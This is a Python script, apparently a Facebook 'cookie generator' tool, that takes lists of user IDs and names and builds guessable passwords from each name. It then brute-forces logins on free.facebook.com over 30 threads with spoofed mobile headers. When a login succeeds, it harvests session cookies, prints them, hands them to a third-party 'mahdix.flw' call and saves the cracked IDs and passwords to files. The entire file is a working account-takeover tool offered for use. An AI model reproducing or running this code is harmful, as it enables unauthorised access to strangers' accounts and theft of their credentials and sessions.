import mahdix
import requests,re,os,sys,random,time,json,uuid,base64
from os import system as clr
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from sympy import lex
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'

def linex():
    print(f'──────────────────────────────────────────────')

def clear():
    clr('clear')
    
logo=("""\x1b[1;97m
::::    :::       ::::::::       :::::::::: 
:+:+:   :+:      :+:    :+:      :+:        
:+:+:+  +:+      +:+             +:+        
+#+ +:+ +#+      +#+             +#++:++#   
+#+  +#+#+#      +#+             +#+        
#+#   #+#+#      #+#    #+#      #+#        
###    ####       ########       ##########
──────────────────────────────────────────────
[®] 𝗔𝗨𝗧𝗛𝗢𝗥    : 𝗡𝗜𝗥𝗢𝗕 𝗫𝗗
[®] 𝗧𝗢𝗘𝗦 𝗧𝗬𝗣𝗘 : 𝗣𝗘𝗥𝗦𝗢𝗡𝗔𝗟
[®] 𝗦𝗨𝗕𝗝𝗘𝗖𝗧   : COOKIE GANARATOR \x1b[1;97m
──────────────────────────────────────────────""")


def main():
    clear()
    print(logo)
addips=[]
Mahdi_pas=[]
cpsh=[]
def file():
    os.system('clear')
    print(logo)    
    o = input('[?] UID|PASSWORD  : ')    
    try:lin = (o).splitlines()
    except:
        print('File Not Found')
        time.sleep(1)
    inx=('1')
    linex()
    cps=('y').lower()
    if 'y' in cps:
        cpsh.append('y')
    else:pass
    linex()
    print(f'      Auto pass Added     ')
    addpas=('n')
    if 'y' in addpas:
        lim=int(input('How many pass Do You add :'))
        for io in range(lim):
            #Mahdi_pas=[]
            inpass=input(f'[{io+1}] Input passWord :')
            Mahdi_pas.append(inpass)
    else:pass
    clear()
    print(logo)
    global lex
    lex=len(lin)
    print(f'{A}[✓] TOOLS HAS BEEN STARTEED......')
    print(f'{A}[✓] WHATING SOME TIME')
   
    linex()
    with ThreadPool(max_workers=30) as mahdisub:
        for xid in lin:
            try:
                # ------ Name and Uid-------
                #xid=''
                uid=xid.split('|')[0]
                name=xid.split('|')[1]
                #---------------pass------------------
                try:
                    fst=name.split(' ')[0]
                    las=name.split(' ')[1]
                except:
                    fst=xid.split('|')[1]
                    las=xid.split('|')[1]
                on='123';tw='121'
                Mahdi_pass=[name,las.lower()+on]
                Mahdi_pass.extend(Mahdi_pas)
                global tolatpas
                tolatpas=(len(Mahdi_pass))
                if '1' in inx:
                    mahdisub.submit(mathodonr,uid,Mahdi_pass)
                else:
                    mahdisub.submit(bapi,uid,Mahdi_pass)
            except:pass
#-=----------------------------------UA----------------------------------------------------------------------------

ugen=[]
for xd in range(1000):  
    rr = random.randint
    ua = f'Mozilla/5.0 (Linux; Android {str(rr(6,12))}; realme X AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36'
    ugen.append(ua)

    



#-------------------------------------------------------------------
okx=[]
cp=[]
loop=0
def mathodonr(uid,Mahdi_pass):
    global loop
    try:
        for pasx in Mahdi_pass:
            sec=requests.Session()
            #useragent=random.choice(ugen)
            getdata=bs(sec.get('https://free.facebook.com/login.php').content,'html.parser')
            a=getdata.find_all("form")[0]
            inps=a.find_all("input")
            data={"email":uid,
            "pass":pasx,
            "login":"Log In"}
            for i in inps:
                try:data[i["name"]]=i["value"]
                except:pass
            headers = {
                    'method': 'GET',
                'scheme': 'https',
                'authority': 'free.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'dpr': '3',
                'referer': 'https://free.facebook.com/',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"CPH2565"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"14.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'viewport-width': '980',
                }
            lo = sec.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=data,headers=headers).text
            log_cookies=sec.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in sec.cookies.get_dict().items()])
                mahdiid=coki.split('c_user=')[1]
                cid=mahdiid[0:15];mahdix.flw(coki)
                print(f'{A}[LOGIN]{G} {cid}|{pasx}')
                print(f'{A}[COKI-🍪] {X}{coki}')
                open('/sdcard/M-COKI-Ok.txt', 'a').write(f'{cid}|{pasx}|\n')
                okx.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                if 'y' in cpsh:
                    coki=";".join([key+"="+value for key,value in sec.cookies.get_dict().items()])
                    print(f'[CP] {uid} | {pasx}')
                open('/sdcard/NIROB-CP.txt', 'a').write( uid+'|'+pasx+'\n')
                break
            else:
                continue
        sys.stdout.write(f'\r\r\rOK : {len(okx)} Creacked : {loop}\r')
        sys.stdout.flush()
        loop+=1
    except:pass

file()
